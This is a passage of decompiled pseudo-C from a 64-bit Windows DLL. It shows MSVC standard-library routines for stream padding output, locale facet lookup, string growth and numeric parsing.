    "    v39 = (unsigned __int8 *)v95;",
    "    if ( v97 > 0xF )",
    "      v39 = (unsigned __int8 *)v95[0];",
    "    v40 = v9;",
    "    if ( !v9 )",
    "      goto LABEL_108;",
    "    v41 = *((_QWORD *)&v90 + 1);",
    "    do",
    "    {",
    "      v42 = *v39;",
    "      if ( !v41",
    "        || (!**(_QWORD **)(v41 + 64) || (v43 = *(int **)(v41 + 88), *v43 <= 0)",
    "          ? (v46 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v41 + 24LL))(v41, *v39))",
    "          : (--*v43, v44 = *(_BYTE ***)(v41 + 64), v45 = *v44, ++*v44, *v45 = v42, v46 = v42),",
    "            v46 == -1) )",
    "      {",
    "        LOBYTE(v90) = 1;",
    "      }",
    "      ++v39;",
    "      --v40;",
    "    }",
    "    while ( v40 );",
    "LABEL_107:",
    "    v33 = v90;",
    "LABEL_108:",
    "    v60 = v91;",
    "    *v91 = v33;",
    "    goto LABEL_109;",
    "  }",
    "  v47 = v9;",
    "  v48 = (unsigned __int8 *)v95;",
    "  if ( v97 > 0xF )",
    "    v48 = (unsigned __int8 *)v95[0];",
    "  if ( v9 )",
    "  {",
    "    v49 = *((_QWORD *)&v90 + 1);",
    "    do",
    "    {",
    "      v50 = *v48;",
    "      if ( !v49",
    "        || (!**(_QWORD **)(v49 + 64) || (v51 = *(int **)(v49 + 88), *v51 <= 0)",
    "          ? (v54 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v49 + 24LL))(v49, *v48))",
    "          : (--*v51, v52 = *(_BYTE ***)(v49 + 64), v53 = *v52, ++*v52, *v53 = v50, v54 = v50),",
    "            v54 == -1) )",
    "      {",
    "        LOBYTE(v90) = 1;",
    "      }",
    "      ++v48;",
    "      --v47;",
    "    }",
    "    while ( v47 );",
    "    v33 = v90;",
    "  }",
    "  v90 = v33;",
    "  if ( v31 )",
    "  {",
    "    v55 = *((_QWORD *)&v90 + 1);",
    "    do",
    "    {",
    "      if ( !v55",
    "        || (!**(_QWORD **)(v55 + 64) || (v56 = *(int **)(v55 + 88), *v56 <= 0)",
    "          ? (v59 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v55 + 24LL))(v55, a5))",
    "          : (--*v56, v57 = *(unsigned __int8 ***)(v55 + 64), v58 = *v57, ++*v57, *v58 = a5, v59 = a5),",
    "            v59 == -1) )",
    "      {",
    "        LOBYTE(v90) = 1;",
    "      }",
    "      --v31;",
    "    }",
    "    while ( v31 );",
    "    v33 = v90;",
    "  }",
    "  *v91 = v33;",
    "  v31 = 0;",
    "  v60 = v91;",
    "LABEL_109:",
    "  v69 = *v60;",
    "  v90 = *v60;",
    "  v70 = v95;",
    "  if ( v97 > 0xF )",
    "    v70 = (_QWORD *)v95[0];",
    "  v71 = (unsigned __int8 *)v70 + v9;",
    "  v72 = v29 - v9;",
    "  if ( v72 )",
    "  {",
    "    v73 = *((_QWORD *)&v90 + 1);",
    "    do",
    "    {",
    "      v74 = *v71;",
    "      if ( !v73",
    "        || (!**(_QWORD **)(v73 + 64) || (v75 = *(int **)(v73 + 88), *v75 <= 0)",
    "          ? (v78 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v73 + 24LL))(v73, *v71))",
    "          : (--*v75, v76 = *(_BYTE ***)(v73 + 64), v77 = *v76, ++*v76, *v77 = v74, v78 = v74),",
    "            v78 == -1) )",
    "      {",
    "        LOBYTE(v90) = 1;",
    "      }",
    "      ++v71;",
    "      --v72;",
    "    }",
    "    while ( v72 );",
    "    v69 = v90;",
    "  }",
    "  *(_QWORD *)(v92 + 40) = 0;",
    "  v90 = v69;",
    "  if ( v31 )",
    "  {",
    "    v79 = *((_QWORD *)&v90 + 1);",
    "    do",
    "    {",
    "      if ( !v79",
    "        || (!**(_QWORD **)(v79 + 64) || (v80 = *(int **)(v79 + 88), *v80 <= 0)",
    "          ? (v83 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v79 + 24LL))(v79, a5))",
    "          : (--*v80, v81 = *(unsigned __int8 ***)(v79 + 64), v82 = *v81, ++*v81, *v82 = a5, v83 = a5),",
    "            v83 == -1) )",
    "      {",
    "        LOBYTE(v90) = 1;",
    "      }",
    "      --v31;",
    "    }",
    "    while ( v31 );",
    "    v69 = v90;",
    "  }",
    "  v84 = v93;",
    "  *v93 = v69;",
    "  if ( si128.m128i_i64[1] > 0xFuLL )",
    "  {",
    "    v85 = si128.m128i_i64[1] + 1;",
    "    v86 = v98[0];",
    "    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "    {",
    "      v85 = si128.m128i_i64[1] + 40;",
    "      v86 = *(_QWORD *)(v98[0] - 8LL);",
    "      if ( (unsigned __int64)(v98[0] - v86 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v86, v85);",
    "  }",
    "  si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "  LOBYTE(v98[0]) = 0;",
    "  if ( v97 > 0xF )",
    "  {",
    "    v87 = v97 + 1;",
    "    v88 = v95[0];",
    "    if ( v97 + 1 >= 0x1000 )",
    "    {",
    "      v87 = v97 + 40;",
    "      v88 = *(_QWORD *)(v95[0] - 8LL);",
    "      if ( (unsigned __int64)(v95[0] - v88 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v88, v87);",
    "  }",
    "  return v84;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000ABA0(__int64 a1)",
    "{",
    "  __int64 v2; // rbp",
    "  unsigned __int64 v3; // rdi",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rsi",
    "  __int64 v6; // rbx",
    "  __int64 v7; // rax",
    "  _BYTE v9[4]; // [rsp+20h] [rbp-38h] BYREF",
    "  _BYTE v10[4]; // [rsp+24h] [rbp-34h] BYREF",
    "  __int64 v11; // [rsp+28h] [rbp-30h] BYREF",
    "",
    "  sub_18000FC70(v10, 0);",
    "  v2 = qword_18004DE48;",
    "  v11 = qword_18004DE48;",
    "  v3 = qword_18004E1F0;",
    "  if ( !qword_18004E1F0 )",
    "  {",
    "    sub_18000FC70(v9, 0);",
    "    if ( !qword_18004E1F0 )",
    "      qword_18004E1F0 = ++dword_18004C6A0;",
    "    sub_18000FCE8(v9);",
    "    v3 = qword_18004E1F0;",
    "  }",
    "  v4 = *(_QWORD *)(a1 + 8);",
    "  v5 = 8 * v3;",
    "  if ( v3 >= *(_QWORD *)(v4 + 24) )",
    "  {",
    "    v6 = 0;",
    "  }",
    "  else",
    "  {",
    "    v6 = *(_QWORD *)(v5 + *(_QWORD *)(v4 + 16));",
    "    if ( v6 )",
    "      goto LABEL_17;",
    "  }",
    "  if ( !*(_BYTE *)(v4 + 36) )",
    "    goto LABEL_12;",
    "  v7 = sub_1800101B8();",
    "  if ( v3 < *(_QWORD *)(v7 + 24) )",
    "  {",
    "    v6 = *(_QWORD *)(v5 + *(_QWORD *)(v7 + 16));",
    "LABEL_12:",
    "    if ( v6 )",
    "      goto LABEL_17;",
    "  }",
    "  if ( v2 )",
    "  {",
    "    v6 = v2;",
    "  }",
    "  else",
    "  {",
    "    if ( sub_18000C3B0(&v11, a1) == -1 )",
    "      Concurrency::cancel_current_task();",
    "    v6 = v11;",
    "    sub_180010180(v11);",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v6 + 8LL))(v6);",
    "    qword_18004DE48 = v6;",
    "  }",
    "LABEL_17:",
    "  sub_18000FCE8(v10);",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000ACE0(__int64 *a1, __int64 *a2)",
    "{",
    "  __int64 *v3; // rbx",
    "  unsigned __int64 v4; // rdx",
    "  __int64 v5; // rcx",
    "  unsigned __int64 v6; // rdx",
    "  __int64 result; // rax",
    "",
    "  if ( a1 != a2 )",
    "  {",
    "    v3 = a1;",
    "    do",
    "    {",
    "      v4 = v3[3];",
    "      if ( v4 > 0xF )",
    "      {",
    "        v5 = *v3;",
    "        v6 = v4 + 1;",
    "        if ( v6 >= 0x1000 )",
    "        {",
    "          v6 += 39LL;",
    "          if ( (unsigned __int64)(v5 - *(_QWORD *)(v5 - 8) - 8) > 0x1F )",
    "            invalid_parameter_noinfo_noreturn();",
    "          v5 = *(_QWORD *)(v5 - 8);",
    "        }",
    "        result = sub_1800116E0(v5, v6);",
    "      }",
    "      v3[2] = 0;",
    "      v3[3] = 15;",
    "      *(_BYTE *)v3 = 0;",
    "      v3 += 4;",
    "    }",
    "    while ( v3 != a2 );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int64 *__fastcall sub_18000AD70(unsigned __int64 *a1, unsigned __int64 a2, __int64 a3, char a4)",
    "{",
    "  unsigned __int64 v4; // rbp",
    "  __int64 v5; // rdi",
    "  unsigned __int64 v8; // r12",
    "  unsigned __int64 v9; // r14",
    "  unsigned __int64 v10; // rdx",
    "  __int64 v11; // rcx",
    "  unsigned __int64 v12; // rcx",
    "  unsigned __int64 v13; // rbx",
    "  unsigned __int64 v14; // rax",
    "  __int64 v15; // rax",
    "  unsigned __int64 v16; // rdi",
    "  unsigned __int64 v17; // rdx",
    "",
    "  v4 = a1[2];",
    "  v5 = 0x7FFFFFFFFFFFFFFFLL;",
    "  if ( 0x7FFFFFFFFFFFFFFFLL - v4 < a2 )",
    "    std::vector<void *>::_Xlen();",
    "  v8 = a2 + v4;",
    "  v9 = a1[3];",
    "  v10 = (a2 + v4) | 0xF;",
    "  if ( v10 > 0x7FFFFFFFFFFFFFFFLL || (v11 = v9 >> 1, v9 > 0x7FFFFFFFFFFFFFFFLL - (v9 >> 1)) )",
    "  {",
    "    v14 = 0x8000000000000027uLL;",
    "  }",
    "  else",
    "  {",
    "    v5 = v10;",
    "    if ( v10 < v11 + v9 )",
    "      v5 = v11 + v9;",
    "    v12 = v5 + 1;",
    "    if ( v5 == -1 )",
    "    {",
    "      v13 = 0;",
    "      goto LABEL_15;",
    "    }",
    "    if ( v12 < 0x1000 )",
    "    {",
    "      v13 = sub_180011714(v12);",
    "      goto LABEL_15;",
    "    }",
    "    v14 = v5 + 40;",
    "    if ( v5 + 40 < (unsigned __int64)(v5 + 1) )",
    "      Concurrency::cancel_current_task();",
    "  }",
    "  v15 = sub_180011714(v14);",
    "  if ( !v15 )",
    "    goto LABEL_22;",
    "  v13 = (v15 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "  *(_QWORD *)(v13 - 8) = v15;",
    "LABEL_15:",
    "  a1[2] = v8;",
    "  a1[3] = v5;",
    "  if ( v9 <= 0xF )",
    "  {",
    "    sub_180036160(v13, a1, v4);",
    "    *(_BYTE *)(v13 + v4) = a4;",
    "    *(_BYTE *)(v13 + v4 + 1) = 0;",
    "    goto LABEL_21;",
    "  }",
    "  v16 = *a1;",
    "  sub_180036160(v13, *a1, v4);",
    "  v17 = v9 + 1;",
    "  *(_BYTE *)(v13 + v4) = a4;",
    "  *(_BYTE *)(v13 + v4 + 1) = 0;",
    "  if ( v9 + 1 >= 0x1000 )",
    "  {",
    "    v17 = v9 + 40;",
    "    if ( v16 - *(_QWORD *)(v16 - 8) - 8 <= 0x1F )",
    "    {",
    "      v16 = *(_QWORD *)(v16 - 8);",
    "      goto LABEL_19;",
    "    }",
    "LABEL_22:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_19:",
    "  sub_1800116E0(v16, v17);",
    "LABEL_21:",
    "  *a1 = v13;",
    "  return a1;",
    "}",
    "",
    "",
    "unsigned __int64 *__fastcall sub_18000AEE0(",
    "        unsigned __int64 *a1,",
    "        unsigned __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5)",
    "{",
    "  unsigned __int64 v5; // r15",
    "  __int64 v6; // rbx",
    "  unsigned __int64 v9; // rbp",
    "  unsigned __int64 v10; // rdx",
    "  unsigned __int64 v11; // r13",
    "  __int64 v12; // rcx",
    "  unsigned __int64 v13; // rcx",
    "  unsigned __int64 v14; // rdi",
    "  unsigned __int64 v15; // rax",
    "  __int64 v16; // rax",
    "  unsigned __int64 v17; // r14",
    "  unsigned __int64 v18; // rbx",
    "  unsigned __int64 v19; // rdx",
    "",
    "  v5 = a1[2];",
    "  v6 = 0x7FFFFFFFFFFFFFFFLL;",
    "  if ( 0x7FFFFFFFFFFFFFFFLL - v5 < a2 )",
    "    std::vector<void *>::_Xlen();",
    "  v9 = a2 + v5;",
    "  v10 = (a2 + v5) | 0xF;",
    "  v11 = a1[3];",
    "  if ( v10 > 0x7FFFFFFFFFFFFFFFLL || (v12 = v11 >> 1, v11 > 0x7FFFFFFFFFFFFFFFLL - (v11 >> 1)) )",
    "  {",
    "    v15 = 0x8000000000000027uLL;",
    "  }",
    "  else",
    "  {",
    "    v6 = v10;",
    "    if ( v10 < v12 + v11 )",
    "      v6 = v12 + v11;",
    "    v13 = v6 + 1;",
    "    if ( v6 == -1 )",
    "    {",
    "      v14 = 0;",
    "      goto LABEL_15;",
    "    }",
    "    if ( v13 < 0x1000 )",
    "    {",
    "      v14 = sub_180011714(v13);",
    "      goto LABEL_15;",
    "    }",
    "    v15 = v6 + 40;",
    "    if ( v6 + 40 < (unsigned __int64)(v6 + 1) )",
    "      Concurrency::cancel_current_task();",
    "  }",
    "  v16 = sub_180011714(v15);",
    "  if ( !v16 )",
    "    goto LABEL_22;",
    "  v14 = (v16 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "  *(_QWORD *)(v14 - 8) = v16;",
    "LABEL_15:",
    "  a1[2] = v9;",
    "  v17 = v14 + v5;",
    "  a1[3] = v6;",
    "  if ( v11 <= 0xF )",
    "  {",
    "    sub_180036160(v14, a1, v5);",
    "    sub_180036160(v14 + v5, a4, a5);",
    "    *(_BYTE *)(v17 + a5) = 0;",
    "    goto LABEL_21;",
    "  }",
    "  v18 = *a1;",
    "  sub_180036160(v14, *a1, v5);",
    "  sub_180036160(v14 + v5, a4, a5);",
    "  v19 = v11 + 1;",
    "  *(_BYTE *)(v17 + a5) = 0;",
    "  if ( v11 + 1 >= 0x1000 )",
    "  {",
    "    v19 = v11 + 40;",
    "    if ( v18 - *(_QWORD *)(v18 - 8) - 8 <= 0x1F )",
    "    {",
    "      v18 = *(_QWORD *)(v18 - 8);",
    "      goto LABEL_19;",
    "    }",
    "LABEL_22:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_19:",
    "  sub_1800116E0(v18, v19);",
    "LABEL_21:",
    "  *a1 = v14;",
    "  return a1;",
    "}",
    "",
    "",
    "unsigned __int64 *__fastcall sub_18000B070(",
    "        unsigned __int64 *a1,",
    "        unsigned __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        char a6)",
    "{",
    "  unsigned __int64 v6; // rbp",
    "  __int64 v7; // rbx",
    "  unsigned __int64 v10; // r13",
    "  unsigned __int64 v11; // r15",
    "  unsigned __int64 v12; // rdx",
    "  __int64 v13; // rcx",
    "  unsigned __int64 v14; // rcx",
    "  unsigned __int64 v15; // rdi",
    "  unsigned __int64 v16; // rax",
    "  __int64 v17; // rax",
    "  __int64 v18; // r15",
    "  unsigned __int64 v19; // rbx",
    "  unsigned __int64 v20; // rdx",
    "",
    "  v6 = a1[2];",
    "  v7 = 0x7FFFFFFFFFFFFFFFLL;",
    "  if ( 0x7FFFFFFFFFFFFFFFLL - v6 < a2 )",
    "    std::vector<void *>::_Xlen();",
    "  v10 = a1[3];",
    "  v11 = a2 + v6;",
    "  v12 = (a2 + v6) | 0xF;",
    "  if ( v12 > 0x7FFFFFFFFFFFFFFFLL || (v13 = v10 >> 1, v10 > 0x7FFFFFFFFFFFFFFFLL - (v10 >> 1)) )",
    "  {",
    "    v16 = 0x8000000000000027uLL;",
    "  }",
    "  else",
    "  {",
    "    v7 = v12;",
    "    if ( v12 < v13 + v10 )",
    "      v7 = v13 + v10;",
    "    v14 = v7 + 1;",
    "    if ( v7 == -1 )",
    "    {",
    "      v15 = 0;",
    "      goto LABEL_15;",
    "    }",
    "    if ( v14 < 0x1000 )",
    "    {",
    "      v15 = sub_180011714(v14);",
    "      goto LABEL_15;",
    "    }",
    "    v16 = v7 + 40;",
    "    if ( v7 + 40 < (unsigned __int64)(v7 + 1) )",
    "      Concurrency::cancel_current_task();",
    "  }",
    "  v17 = sub_180011714(v16);",
    "  if ( !v17 )",
    "    goto LABEL_22;",
    "  v15 = (v17 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "  *(_QWORD *)(v15 - 8) = v17;",
    "LABEL_15:",
    "  a1[3] = v7;",
    "  a1[2] = v11;",
    "  v18 = a4 + v15;",
    "  if ( v10 <= 0xF )",
    "  {",
    "    sub_180036160(v15, a1, a4);",
    "    sub_1800368A0(a4 + v15, (unsigned int)a6, a5);",
    "    sub_180036160(v18 + a5, (char *)a1 + a4, v6 - a4 + 1);",
    "    goto LABEL_21;",
    "  }",
    "  v19 = *a1;",
    "  sub_180036160(v15, *a1, a4);",
    "  sub_1800368A0(a4 + v15, (unsigned int)a6, a5);",
    "  sub_180036160(v18 + a5, a4 + v19, v6 - a4 + 1);",
    "  v20 = v10 + 1;",
    "  if ( v10 + 1 >= 0x1000 )",
    "  {",
    "    v20 = v10 + 40;",
    "    if ( v19 - *(_QWORD *)(v19 - 8) - 8 <= 0x1F )",
    "    {",
    "      v19 = *(_QWORD *)(v19 - 8);",
    "      goto LABEL_19;",
    "    }",
    "LABEL_22:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_19:",
    "  sub_1800116E0(v19, v20);",
    "LABEL_21:",
    "  *a1 = v15;",
    "  return a1;",
    "}",
    "",
    "",
    "unsigned __int64 *__fastcall sub_18000B230(unsigned __int64 *a1, unsigned __int64 a2, __int64 a3, __int64 a4, char a5)",
    "{",
    "  unsigned __int64 v5; // rbp",
    "  __int64 v6; // rdi",
    "  unsigned __int64 v9; // r14",
    "  unsigned __int64 v10; // r15",
    "  unsigned __int64 v11; // rdx",
    "  __int64 v12; // rcx",
    "  unsigned __int64 v13; // rcx",
    "  unsigned __int64 v14; // rbx",
    "  unsigned __int64 v15; // rax",
    "  __int64 v16; // rax",
    "  __int64 v17; // r13",
    "  unsigned __int64 v18; // rdi",
    "  unsigned __int64 v19; // rdx",
    "",
    "  v5 = a1[2];",
    "  v6 = 0x7FFFFFFFFFFFFFFFLL;",
    "  if ( 0x7FFFFFFFFFFFFFFFLL - v5 < a2 )",
    "    std::vector<void *>::_Xlen();",
    "  v9 = a1[3];",
    "  v10 = a2 + v5;",
    "  v11 = (a2 + v5) | 0xF;",
    "  if ( v11 > 0x7FFFFFFFFFFFFFFFLL || (v12 = v9 >> 1, v9 > 0x7FFFFFFFFFFFFFFFLL - (v9 >> 1)) )",
    "  {",
    "    v15 = 0x8000000000000027uLL;",
    "  }",
    "  else",
    "  {",
    "    v6 = v11;",
    "    if ( v11 < v12 + v9 )",
    "      v6 = v12 + v9;",
    "    v13 = v6 + 1;",
    "    if ( v6 == -1 )",
    "    {",
    "      v14 = 0;",
    "      goto LABEL_15;",
    "    }",
    "    if ( v13 < 0x1000 )",
    "    {",
    "      v14 = sub_180011714(v13);",
    "      goto LABEL_15;",
    "    }",
    "    v15 = v6 + 40;",
    "    if ( v6 + 40 < (unsigned __int64)(v6 + 1) )",
    "      Concurrency::cancel_current_task();",
    "  }",
    "  v16 = sub_180011714(v15);",
    "  if ( !v16 )",
    "    goto LABEL_22;",
    "  v14 = (v16 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "  *(_QWORD *)(v14 - 8) = v16;",
    "LABEL_15:",
    "  v17 = v14 + a4;",
    "  a1[2] = v10;",
    "  a1[3] = v6;",
    "  if ( v9 <= 0xF )",
    "  {",
    "    sub_180036160(v14, a1, v5);",
    "    sub_1800368A0(v14 + v5, (unsigned int)a5, a4);",
    "    *(_BYTE *)(v17 + v5) = 0;",
    "    goto LABEL_21;",
    "  }",
    "  v18 = *a1;",
    "  sub_180036160(v14, *a1, v5);",
    "  sub_1800368A0(v14 + v5, (unsigned int)a5, a4);",
    "  v19 = v9 + 1;",
    "  *(_BYTE *)(v17 + v5) = 0;",
    "  if ( v9 + 1 >= 0x1000 )",
    "  {",
    "    v19 = v9 + 40;",
    "    if ( v18 - *(_QWORD *)(v18 - 8) - 8 <= 0x1F )",
    "    {",
    "      v18 = *(_QWORD *)(v18 - 8);",
    "      goto LABEL_19;",
    "    }",
    "LABEL_22:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_19:",
    "  sub_1800116E0(v18, v19);",
    "LABEL_21:",
    "  *a1 = v14;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000B3D0(__int64 **a1)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v2; // rcx",
    "",
    "  result = **a1;",
    "  v2 = *(__int64 *)((char *)*a1 + *(int *)(result + 4) + 72);",
    "  if ( v2 )",
    "    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 16LL))(v2);",
    "  return result;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000B400(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _QWORD *a7)",
    "{",
    "  __int16 v10; // ax",
    "  char v11; // bl",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  char v14; // [rsp+31h] [rbp-77h]",
    "  _BYTE *v15; // [rsp+38h] [rbp-70h] BYREF",
    "  __int64 v16; // [rsp+40h] [rbp-68h]",
    "  int v17; // [rsp+48h] [rbp-60h] BYREF",
    "  _BYTE v18[32]; // [rsp+50h] [rbp-58h] BYREF",
    "",
    "  v16 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v16 + 8LL))();",
    "  v10 = sub_18000D640((unsigned int)v18, (_DWORD)a3, a4, 2048, (__int64)&v15);",
    "  v11 = v10;",
    "  v14 = HIBYTE(v10);",
    "  if ( v16 )",
    "  {",
    "    v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v16 + 16LL))(v16);",
    "    if ( v12 )",
    "      (**v12)(v12, 1);",
    "  }",
    "  if ( v11 >= 0 )",
    "  {",
    "    *a7 = sub_180010B70(v18, &v15, (unsigned int)v11, &v17);",
    "    if ( v15 == v18 || v17 )",
    "    {",
    "      *a6 = 2;",
    "      *a7 = 0;",
    "    }",
    "    if ( v14 )",
    "      *a6 = 2;",
    "  }",
    "  else",
    "  {",
    "    *a6 = 2;",
    "    *a7 = 0;",
    "  }",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000B540(",
    "        __int64 a1,",
    "        _OWORD *a2,",
    "        __int128 *a3,",
    "        __int128 *a4,",
    "        __int64 a5,",
    "        _DWORD *a6,",
    "        double *a7)",
    "{",
    "  __int16 v8; // ax",
    "  __int64 v9; // rdx",
    "  char v10; // bl",
    "  __int64 v11; // rcx",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  double v13; // xmm6_8",
    "  int *v14; // rdi",
    "  int v15; // ebx",
    "  int v16; // eax",
    "  char v18; // [rsp+31h] [rbp-3A7h]",
    "  __int128 v19; // [rsp+40h] [rbp-398h] BYREF",
    "  __int128 v20; // [rsp+50h] [rbp-388h] BYREF",
    "  _BYTE *v21; // [rsp+60h] [rbp-378h] BYREF",
    "  __int64 v22; // [rsp+68h] [rbp-370h]",
    "  _BYTE v23[800]; // [rsp+70h] [rbp-368h] BYREF",
    "",
    "  v20 = *a4;",
    "  v19 = *a3;",
    "  v22 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v22 + 8LL))();",
    "  v8 = sub_18000E120((unsigned int)v23, 768, (unsigned int)&v19, (unsigned int)&v20, (__int64)&v21);",
    "  v10 = v8;",
    "  v18 = HIBYTE(v8);",
    "  v11 = v22;",
    "  if ( v22 )",
    "  {",
    "    v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v22 + 16LL))(v22);",
    "    if ( v12 )",
    "      (**v12)(v12, 1);",
    "  }",
    "  if ( !v10 )",
    "  {",
    "    v13 = 0.0;",
    "LABEL_9:",
    "    *a6 = 2;",
    "    goto LABEL_10;",
    "  }",
    "  v14 = (int *)sub_18001A80C(v11, v9);",
    "  v15 = *v14;",
    "  *v14 = 0;",
    "  v13 = sub_18001E15C(v23, &v21);",
    "  v16 = *v14;",
    "  *v14 = v15;",
    "  if ( v21 == v23 || v16 || v18 )",
    "    goto LABEL_9;",
    "LABEL_10:",
    "  if ( (unsigned __int8)sub_18000E050(&v19, &v20) )",
    "    *a6 |= 1u;",
    "  *a7 = v13;",
    "  *a2 = v19;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000B690(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, double *a7)",
    "{",
    "  __int16 v10; // ax",
    "  __int64 v11; // rdx",
    "  char v12; // bl",
    "  __int64 v13; // rcx",
    "  void (__fastcall ***v14)(_QWORD, __int64); // rax",
    "  int *v15; // rdi",
    "  int v16; // ebx",
    "  double v17; // xmm0_8",
    "  int v18; // eax",
    "  char v20; // [rsp+31h] [rbp-387h]",
    "  _BYTE *v21; // [rsp+38h] [rbp-380h] BYREF",
    "  __int64 v22; // [rsp+40h] [rbp-378h]",
    "  _BYTE v23[800]; // [rsp+50h] [rbp-368h] BYREF",
    "",
    "  v22 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v22 + 8LL))();",
    "  v10 = sub_18000E120((unsigned int)v23, 768, (_DWORD)a3, a4, (__int64)&v21);",
    "  v12 = v10;",
    "  v20 = HIBYTE(v10);",
    "  v13 = v22;",
    "  if ( v22 )",
    "  {",
    "    v14 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v22 + 16LL))(v22);",
    "    if ( v14 )",
    "      (**v14)(v14, 1);",
    "  }",
    "  if ( v12 )",
    "  {",
    "    v15 = (int *)sub_18001A80C(v13, v11);",
    "    v16 = *v15;",
    "    *v15 = 0;",
    "    v17 = sub_18001E15C(v23, &v21);",
    "    v18 = *v15;",
    "    *v15 = v16;",
    "    *a7 = v17;",
    "    if ( v21 == v23 || v18 || v20 )",
    "      *a6 = 2;",
    "  }",
    "  else",
    "  {",
    "    *a6 = 2;",
    "    *a7 = 0.0;",
    "  }",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000B7D0(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, float *a7)",
    "{",
    "  __int16 v10; // ax",
    "  __int64 v11; // rdx",
    "  char v12; // bl",
    "  __int64 v13; // rcx",
    "  void (__fastcall ***v14)(_QWORD, __int64); // rax",
    "  int *v15; // rdi",
    "  int v16; // ebx",
    "  float v17; // xmm0_4",
    "  int v18; // eax",
    "  char v20; // [rsp+31h] [rbp-387h]",
    "  _BYTE *v21; // [rsp+38h] [rbp-380h] BYREF",
    "  __int64 v22; // [rsp+40h] [rbp-378h]",
    "  _BYTE v23[800]; // [rsp+50h] [rbp-368h] BYREF",
    "",
    "  v22 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v22 + 8LL))();",
    "  v10 = sub_18000E120((unsigned int)v23, 768, (_DWORD)a3, a4, (__int64)&v21);",
    "  v12 = v10;",
    "  v20 = HIBYTE(v10);",
    "  v13 = v22;",
    "  if ( v22 )",
    "  {",
    "    v14 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v22 + 16LL))(v22);",
    "    if ( v14 )",
    "      (**v14)(v14, 1);",
    "  }",
    "  if ( v12 )",
    "  {",
    "    v15 = (int *)sub_18001A80C(v13, v11);",
    "    v16 = *v15;",
    "    *v15 = 0;",
    "    v17 = sub_18001E164(v23, &v21);",
    "    v18 = *v15;",
    "    *v15 = v16;",
    "    *a7 = v17;",
    "    if ( v21 == v23 || v18 || v20 )",
    "      *a6 = 2;",
    "  }",
    "  else",
    "  {",
    "    *a6 = 2;",
    "    *a7 = 0.0;",
    "  }",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000B910(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _QWORD *a7)",
    "{",
    "  __int16 v10; // ax",
    "  char v11; // bl",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  char v14; // [rsp+31h] [rbp-77h]",
    "  _BYTE *v15; // [rsp+38h] [rbp-70h] BYREF",
    "  __int64 v16; // [rsp+40h] [rbp-68h]",
    "  int v17; // [rsp+48h] [rbp-60h] BYREF",
    "  _BYTE v18[32]; // [rsp+50h] [rbp-58h] BYREF",
    "",
    "  v16 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v16 + 8LL))();",
